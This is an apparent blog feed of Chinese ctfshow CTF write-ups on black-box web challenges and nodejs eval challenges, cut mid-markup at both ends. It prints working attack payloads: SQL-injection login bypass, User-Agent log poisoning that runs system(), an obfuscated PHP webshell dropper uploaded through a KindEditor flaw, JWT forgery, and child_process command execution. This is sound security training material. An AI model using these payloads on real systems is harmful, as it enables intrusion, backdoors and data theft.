* (<span class="built_in">int</span>(i) + <span class="number">1</span>) + <span class="string">&quot;))))&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">str</span> += <span class="string">&quot;\\\\&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;$\\&#x27;&quot;</span> + <span class="built_in">str</span> + <span class="string">&quot;\\&#x27;&quot;</span>)</span><br></pre></td></tr></table></figure><p>最终payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=__=$(())%26%26$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\&lt;\&lt;\&lt;\$\&#x27;\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))))))\\$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\&#x27;</span><br></pre></td></tr></table></figure><p>这里有一个新知识，可以通杀</p><p><img src="../images/image-20230220174830458.png" alt="image-20230220174830458"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="variable">$_</span>有自己的意思，就是记录上一次的值,所以加一的话就会输出a下一位的b</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_=(<span class="string">&#x27;@&#x27;</span>^<span class="string">&#x27;!&#x27;</span>); //a</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">__=<span class="variable">$_</span>++; //b</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">___=++<span class="variable">$__</span>; //c</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">____=++<span class="variable">$___</span>; //d</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_____=++<span class="variable">$____</span>; //e</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">______=++<span class="variable">$_____</span>; //f</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_______=++<span class="variable">$______</span>; //g</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">________=++<span class="variable">$_______</span>; //h</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_________=++<span class="variable">$________</span>; //i</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">__________=++<span class="variable">$_________</span>; //j</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">___________=++<span class="variable">$__________</span>; //k</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">____________=++<span class="variable">$___________</span>; //l</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_____________=++<span class="variable">$____________</span>; //m</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">______________=++<span class="variable">$_____________</span>; //n</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_______________=++<span class="variable">$______________</span>; //o</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">________________=++<span class="variable">$_______________</span>; //p</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_________________=++<span class="variable">$________________</span>; //q</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">__________________=++<span class="variable">$_________________</span>; //r</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">___________________=++<span class="variable">$__________________</span>; //s</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">____________________=++<span class="variable">$___________________</span>; //t</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_____________________=++<span class="variable">$____________________</span>; //u</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">______________________=++<span class="variable">$_____________________</span>; //v</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_______________________=++<span class="variable">$______________________</span>; //w</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">________________________=++<span class="variable">$_______________________</span>; //x</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_________________________=++<span class="variable">$________________________</span>; //y</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">__________________________=++<span class="variable">$_________________________</span>; //z</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;关于getFlag()函数的命令执行  &lt;a href=&quot;https://www.anquanke.com/post/id/154284&quot;&gt;文章&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;官方wp &lt;a href=&quot;https://ctf-show.feishu.cn/docx/EH72dMi</summary>
      
    
    
    
    
    <category term="ctfshow 极限命令执行ji" scheme="https://ke1nys.github.io/tags/ctfshow-%E6%9E%81%E9%99%90%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cji/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-黑盒测试 刷题记录</title>
    <link href="https://ke1nys.github.io/posts/fed48c7b.html"/>
    <id>https://ke1nys.github.io/posts/fed48c7b.html</id>
    <published>2023-02-02T13:02:20.000Z</published>
    <updated>2023-02-21T13:54:36.259Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.wangan.com/wenda/1860">什么是黑盒测试</a></p><p>这个黑盒测试就是我们不知道是啥考点，得自己去挖掘，然后找到这个是考哪个知识点的</p><h2 id="web380-目录扫描"><a href="#web380-目录扫描" class="headerlink" title="web380(目录扫描)"></a>web380(目录扫描)</h2><p>题目</p><p><img src="../images/image-20230202223826824.png" alt="image-20230202223826824"></p><p>就是这里的话会出现<code>page_1.php</code>    <code>page_2.php</code>  <code>page_3.php</code></p><p>然后我们就得尝试去发现<code>page.php</code>  这就是一种思维发散，毕竟在网站上没看到的话，服务器上不一定没有。   </p><p>难点就在这里</p><p><img src="../images/image-20230202224032610.png" alt="image-20230202224032610"></p><p>出现个$id，我们可以尝试给id传个值看看</p><p><img src="../images/image-20230202224117796.png" alt="image-20230202224117796"></p><p>发现是个文件包含的题目，并且限定了后缀，所以我们就得尝试去查看一下<code>page.php</code>源码</p><p><strong>page.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-08 19:50:40</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-08 19:59:24</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$id</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;打开$id.php失败&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$html</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$id</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$html</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们就去猜是否存在flag.php</p><p><img src="../images/image-20230202224440246.png" alt="image-20230202224440246"></p><p>最后拿到flag.</p><h2 id="web381-css路径"><a href="#web381-css路径" class="headerlink" title="web381(css路径)"></a>web381(css路径)</h2><p>题目</p><p><img src="../images/image-20230202224640173.png" alt="image-20230202224640173"></p><p>和上一题是一样的</p><p><img src="../images/image-20230202225033153.png" alt="image-20230202225033153"></p><p>打开源码发现有个不一样的地方，然后访问/alsckdfy就能拿到flag了。</p><p>这里是因为前端和后端共用一个css路径，然后前端就会泄露出来，那么别人就会尝试去登录看看，就会发现了后台地址。</p><h2 id="web382-万能密码-爆破-sqlmap"><a href="#web382-万能密码-爆破-sqlmap" class="headerlink" title="web382(万能密码/爆破/sqlmap)"></a>web382(万能密码/爆破/sqlmap)</h2><p>题目</p><p><img src="../images/image-20230202225519773.png" alt="image-20230202225519773"></p><p>因为我们在<strong>web381</strong>拿到了后台管理员登录地址，所以我们直接访问</p><p><img src="../images/image-20230202225902255.png" alt="image-20230202225902255"></p><p>那么我们就可以尝试一下默认密码登录试试</p><p>admin/admin    admin/123   admin/admin888</p><p>那么经过尝试的话，发现是<strong>admin/admin888</strong>是后台管理员密码</p><p>这里给一个弱口令密码       <code>nE7jA%5m</code></p><p><img src="../images/image-20230202230438228.png" alt="image-20230202230438228"></p><p><strong>解法二</strong></p><p>后台万能密码登录</p><p><code>admin</code></p><p><code>admin&#39; or 1=1#</code></p><h2 id="web383-爆破-万能密码"><a href="#web383-爆破-万能密码" class="headerlink" title="web383(爆破/万能密码)"></a>web383(爆破/万能密码)</h2><p><img src="../images/image-20230202230734384.png" alt="image-20230202230734384"></p><p><strong>payload</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="operator">/</span>admin<span class="string">&#x27; or 1=1#    ---&gt;写在username或者password都行</span></span><br></pre></td></tr></table></figure><h2 id="web384-爆破"><a href="#web384-爆破" class="headerlink" title="web384(爆破)"></a>web384(爆破)</h2><p>题目</p><p><img src="../images/image-20230202231129790.png" alt="image-20230202231129790"></p><p><img src="../images/image-20230202231241003.png" alt="image-20230202231241003"></p><p>题目还给了提示，那么我们就直接爆破就行了</p><p>可以先自己写一个密码的生成字典，然后在拿去bp爆破</p><p>密码是  <strong>xy123</strong></p><p>得爆破  —-&gt;635000次，还是给提示的情况下，一般情况下，爆破一般是不用的，不到万不得已时最好不用，因为时间太久了</p><h2 id="web385-配置文件利用"><a href="#web385-配置文件利用" class="headerlink" title="web385(配置文件利用)"></a>web385(配置文件利用)</h2><p>题目</p><p><img src="../images/image-20230202231836152.png" alt="image-20230202231836152"></p><p>扫描后台扫出一个/install后台安装目录</p><p>然后访问，通过提示重置后台管理员密码，那么我们就可以登录后台了</p><p>admin/admin888   (上面的题得出的结论)</p><h2 id="web386-配置文件利用"><a href="#web386-配置文件利用" class="headerlink" title="web386(配置文件利用)"></a>web386(配置文件利用)</h2><p>题目</p><p><img src="../images/image-20230202235025560.png" alt="image-20230202235025560"></p><p>通过扫描后台发现install</p><p>clear.php时看源码时发现的</p><p><img src="../images/image-20230205192730195.png" alt="image-20230205192730195"></p><p>由于这里和上面的不一样，所以就考虑一下去访问这个低质，并把alsckdfy给去掉，访问后面的</p><p><img src="../images/image-20230205192901028.png" alt="image-20230205192901028"></p><p>出现一个压缩过的文件内容，那么我们就把这个给解压缩下来查看</p><p><strong>压缩脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://f50cd95d-d7d9-4454-802e-3cd1b681e803.challenge.ctf.show/layui/css/tree.css&#x27;</span></span><br><span class="line">html = requests.get(url)</span><br><span class="line"><span class="built_in">print</span>(html.cont</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230205193156553.png" alt="image-20230205193156553"></p><p>进行解码后发现存在clear.php文件，这就是发现clear.php的过程</p><p>然后就去访问install</p><p><img src="../images/image-20230203002152913.png" alt="image-20230203002152913"></p><p>存在lock锁定程序，不能进行密码重置了，那么我们就得想办法去删除这个程序，然后这里就有一个clear.php没用到，那么我们就可以尝试去用他。</p><p><img src="../images/image-20230203002311775.png" alt="image-20230203002311775"></p><p>就说清理完成，但不知清理了啥，那我们就得考虑一下清理的参数是啥，盲猜一波file,尝试清理index.php看看。</p><p><img src="../images/image-20230203002537481.png" alt="image-20230203002537481"></p><p>被清理掉了，那么我们就尝试把lock.bat也给清理掉</p><p><img src="../images/image-20230203002721549.png" alt="image-20230203002721549"></p><p>成功清理掉了，那么我们就可以重置密码，然后登录后台了</p><p>默认密码 admin/admin888</p><h2 id="web387-日志文件包含-编辑器"><a href="#web387-日志文件包含-编辑器" class="headerlink" title="web387(日志文件包含  编辑器)"></a>web387(日志文件包含  编辑器)</h2><p>题目</p><p>这里的话时不给删除锁定文件了，那么我们就可以换个思路，查看源码，看有没有啥新的东西进行泄露。</p><p><img src="../images/image-20230205193922017.png" alt="image-20230205193922017"></p><p>发现一个路径很想编辑器的路径，那么我们就进行访问编辑器路径看看。</p><p><img src="../images/image-20230205194048868.png" alt="image-20230205194048868"></p><p>发现确实存在这个编辑器</p><p><img src="../images/image-20230205194132606.png" alt="image-20230205194132606"></p><p>然后发现是个4.1.11版本的，这个版本存在一个上传html的漏洞，但是这里不能上传php代码，因为源码里默认时阻止的，所以我们就得去看一下别的思路</p><p>但是这里是可以直接上传图片和压缩包的，那么我们可以直接在压缩包里写入php代码然后进行上传，效果是一样的。</p><p>然后 扫目录扫扫到一个robots.txt</p><p><img src="../images/image-20230205194644640.png" alt="image-20230205194644640"></p><p>发现一个<strong>/debug</strong>路径</p><p><img src="../images/image-20230205194935811.png" alt="image-20230205194935811"></p><p><img src="../images/image-20230205195546158.png" alt="image-20230205195546158"></p><p>成功执行，那么我们就尝试一下日志文件包含试一试</p><p>这里尝试过写入一句话木马，发现执行不了，所以这里可能是不可以传参数，只能在UA处进行代码执行</p><p><strong>第一步</strong></p><p>在ua处写入 <code>&lt;?php system(&#39;ls / &gt;/var/www/html/1.txt&#39;);?&gt;</code></p><p><img src="../images/image-20230205200136409.png" alt="image-20230205200136409"></p><p>然后在/debug后面加上<code>?file=/var/log/nginx/access.log</code>然后访问，最后在访问1.txt就可以了</p><p><img src="../images/image-20230205200242374.png" alt="image-20230205200242374"></p><p>发现可以成功写入，那么我们就直接查看后台登录源码就行。</p><p>那么在ua处就得重新写入，其他和上面一样</p><p>&lt;?php system(‘ls /var/www/html/alsckdfy/check.php &gt;/var/www/html/2.txt’);?&gt;</p><p><img src="../images/image-20230205200708305.png" alt="image-20230205200708305"></p><p>然后就可以拿到flag了。</p><p><strong>解法二</strong></p><p>因为在ua处可以执行php代码，那么我们就可以删除掉lock.dat文件，然后重新安装，使用默认密码登录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user-agent:<span class="meta">&lt;?php</span> <span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;/var/www/html/install/lock.dat&#x27;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="web388-CVE-2017-1002024-免杀马"><a href="#web388-CVE-2017-1002024-免杀马" class="headerlink" title="web388(CVE-2017-1002024/免杀马)"></a>web388(CVE-2017-1002024/<strong>免杀马</strong>)</h2><p>题目</p><p><img src="../images/image-20230205201200594.png" alt="image-20230205201200594"></p><p>这里是发现<strong>web377</strong>的方法用不了了，还有这个自带的杀毒软件会把php一句话木马给过滤掉了，那么我们就得想想别的方法了，然后上面题提到的editor还没用到，那么这题我们就可以来尝试一下</p><p>这个editor版本的漏洞是  <a href="https://wiki.96.mk/Web安全/Kindeditor/（CVE-2017-1002024）Kindeditor &lt;%3D4.1.11 上传漏洞/">CVE-2017-1002024</a></p><p>这里怎么发现的editor上面的wp有讲</p><p>写入一个免杀码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;&lt;?ph&#x27;</span>.<span class="string">&#x27;p ev&#x27;</span>.<span class="string">&#x27;al($_PO&#x27;</span>.<span class="string">&#x27;ST[1]);?&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;/var/www/html/1.php&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>写入到txt文件中，然后进行上传</p><p><img src="../images/image-20230205205012187.png" alt="image-20230205205012187"></p><p>然后通过<strong>/debug?file=</strong>参数传给日志文件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/debug/?file=/var/www/html/alsckdfy/attached/file/20230205/20230205124929_21190.txt</span><br></pre></td></tr></table></figure><p>访问日志文件，执行一句话</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/debug/?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure><p>然后访问1.php进行rce</p><p>成功写入</p><p><img src="../images/image-20230205205243943.png" alt="image-20230205205243943"></p><p><img src="../images/image-20230205205422574.png" alt="image-20230205205422574"></p><h2 id="web389-session伪造-jwt-日志文件包含"><a href="#web389-session伪造-jwt-日志文件包含" class="headerlink" title="web389(session伪造/jwt/日志文件包含)"></a>web389(session伪造/jwt/日志文件包含)</h2><p>题目</p><p><img src="../images/image-20230205210521806.png" alt="image-20230205210521806"></p><p><img src="../images/image-20230205210544839.png" alt="image-20230205210544839"></p><p>访问/debug，然后提示权限不足，那么就暗示我们不是管理员，这时候查看下cookie，</p><p><img src="../images/image-20230205210647871.png" alt="image-20230205210647871"></p><p>发现是eyjh开头的，那么就会条件反射到<strong>jwt</strong></p><p><img src="../images/image-20230205213300447.png" alt="image-20230205213300447"></p><p>这里的密钥是猜的，然后修改user为admin就好了，这里的密钥是123456，是猜出来的。</p><p><img src="../images/image-20230221214351604.png" alt="image-20230221214351604"></p><p>这个输出就是代表着写入成功。</p><p>那么我们会选择上传一个压缩文件，里面带着一个木马(免杀码)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;&lt;?ph&#x27;</span>.<span class="string">&#x27;p ev&#x27;</span>.<span class="string">&#x27;al($_PO&#x27;</span>.<span class="string">&#x27;ST[1]);?&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;/var/www/html/1.php&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后去访问<code>/debug/?file=/var/www/html/alsckdfy/attached/file/20230221/20230221134621_53294.zip</code></p><p>然后访问1.php就可以进行rce了</p><p><strong>这个这专题剩下的内容就不想写了，写java题去了</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://www.wangan.com/wenda/1860&quot;&gt;什么是黑盒测试&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这个黑盒测试就是我们不知道是啥考点，得自己去挖掘，然后找到这个是考哪个知识点的&lt;/p&gt;
&lt;h2 id=&quot;web380-目录扫描&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    
    <category term="ctfshow 黑盒测试 刷题记录" scheme="https://ke1nys.github.io/tags/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-phpcve 刷题记录</title>
    <link href="https://ke1nys.github.io/posts/71eebe5f.html"/>
    <id>https://ke1nys.github.io/posts/71eebe5f.html</id>
    <published>2023-02-01T13:35:03.000Z</published>
    <updated>2023-02-21T10:37:42.437Z</updated>
    
    <content type="html"><![CDATA[<p>这个phpcve专题我就不写了，看这个师傅的wp就行了，写的很详细了</p><p><a href="https://blog.csdn.net/qq_42880719/article/details/122513194">这篇文章</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这个phpcve专题我就不写了，看这个师傅的wp就行了，写的很详细了&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/qq_42880719/article/details/122513194&quot;&gt;这篇文章&lt;/a&gt;&lt;/p&gt;
</summary>
      
    
    
    
    
    <category term="ctfshow phpcve 刷题记录" scheme="https://ke1nys.github.io/tags/ctfshow-phpcve-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-nodejs 刷题记录</title>
    <link href="https://ke1nys.github.io/posts/bfd00f80.html"/>
    <id>https://ke1nys.github.io/posts/bfd00f80.html</id>
    <published>2023-01-30T10:02:45.000Z</published>
    <updated>2023-02-01T13:32:35.674Z</updated>
    
    <content type="html"><![CDATA[<p>nodejs官方中文文档，不明白的东西可以进去查 <a href="http://nodejs.cn/api">文档</a></p><p>这篇文章写的很好  —-&gt;  <a href="https://tari.moe/2021/05/04/ctfshow-nodejs/">nodejs的wp</a></p><h2 id="web334"><a href="#web334" class="headerlink" title="web334"></a>web334</h2><p>题目</p><p><img src="../images/image-20230130180353006.png" alt="image-20230130180353006"></p><p>这里的把文件下载下来，添加后缀.zip就可以看到有两个文件在压缩包里</p><p><img src="../images/image-20230130180558359.png" alt="image-20230130180558359"></p><p><strong>user.js</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">items</span>: [</span><br><span class="line">    &#123;<span class="attr">username</span>: <span class="string">&#x27;CTFSHOW&#x27;</span>, <span class="attr">password</span>: <span class="string">&#x27;123456&#x27;</span>&#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>login.js</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> findUser = <span class="keyword">function</span>(<span class="params">name, password</span>)&#123;</span><br><span class="line">  <span class="keyword">return</span> users.<span class="title function_">find</span>(<span class="keyword">function</span>(<span class="params">item</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> name!==<span class="string">&#x27;CTFSHOW&#x27;</span> &amp;&amp; item.<span class="property">username</span> === name.<span class="title function_">toUpperCase</span>() &amp;&amp; item.<span class="property">password</span> === password;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>就上面的代码时解题关键</p><p>其中toUpperCase()函数为转为大写  用户名不能为大写</p><p>所以payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=ctfshow passwd=123456</span><br></pre></td></tr></table></figure><p><strong>yu师傅给的一个小trick</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在<span class="title class_">Character</span>.<span class="title function_">toUpperCase</span>()函数中，字符ı会转变为I，字符ſ会变为S。</span><br><span class="line">在<span class="title class_">Character</span>.<span class="title function_">toLowerCase</span>()函数中，字符İ会转变为i，字符K会转变为k。</span><br></pre></td></tr></table></figure><h2 id="web335"><a href="#web335" class="headerlink" title="web335"></a>web335</h2><p>题目</p><p><img src="../images/image-20230130182055210.png" alt="image-20230130182055210"></p><p><strong>在<a href="https://so.csdn.net/so/search?q=nodejs&amp;spm=1001.2101.3001.7020">nodejs</a>中，eval()方法用于计算字符串，并把它作为脚本代码来执行，语法为“eval(string)”；如果参数不是字符串，而是整数或者是Function类型，则直接返回该整数或Function。</strong></p><p><a href="http://nodejs.cn/api/child_process.html#child_processexecsynccommand-options">这道题用到的方法</a></p><p>可以去看看，并不难看懂</p><p><strong>payload1</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;ls&#x27;</span>).<span class="title function_">toString</span>()</span><br></pre></td></tr></table></figure><p><strong>payload2</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>=<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">spawnSync</span>(<span class="string">&#x27;ls&#x27;</span>).<span class="property">stdout</span>.<span class="title function_">toString</span>();</span><br><span class="line"><span class="built_in">eval</span>=<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">spawnSync</span>(<span class="string">&#x27;cat&#x27;</span>,[<span class="string">&#x27;fl00g.txt&#x27;</span>]).<span class="property">stdout</span>.<span class="title function_">toString</span>()</span><br></pre></td></tr></table></figure><p>这里先是用<strong>require调用child_process这模块</strong>，然后在调用这个模块里面的函数方法</p><p><img src="../images/image-20230130190208919.png" alt="image-20230130190208919"></p><p>发现一个fl00g.txt，然后直接读取就好了</p><p><img src="../images/image-20230130190401823.png" alt="image-20230130190401823"></p><p>这两个payload的区别，就是有无<strong>args</strong>的区别，详细的话可以自己去上面给的链接里看</p><h2 id="web336"><a href="#web336" class="headerlink" title="web336"></a>web336</h2><p>题目</p><p><img src="../images/image-20230130190632098.png" alt="image-20230130190632098"></p><p>查看源代码又发现是<code>eval</code></p><p>这道题ban了<code>exec</code></p><p>那么这个payload还能用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>=<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">spawnSync</span>(<span class="string">&#x27;ls&#x27;</span>).<span class="property">stdout</span>.<span class="title function_">toString</span>();</span><br><span class="line"><span class="built_in">eval</span>=<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">spawnSync</span>(<span class="string">&#x27;cat&#x27;</span>,[<span class="string">&#x27;fl00g.txt&#x27;</span>]).<span class="property">stdout</span>.<span class="title function_">toString</span>()</span><br></pre></td></tr></table></figure><p><strong>方法二</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td 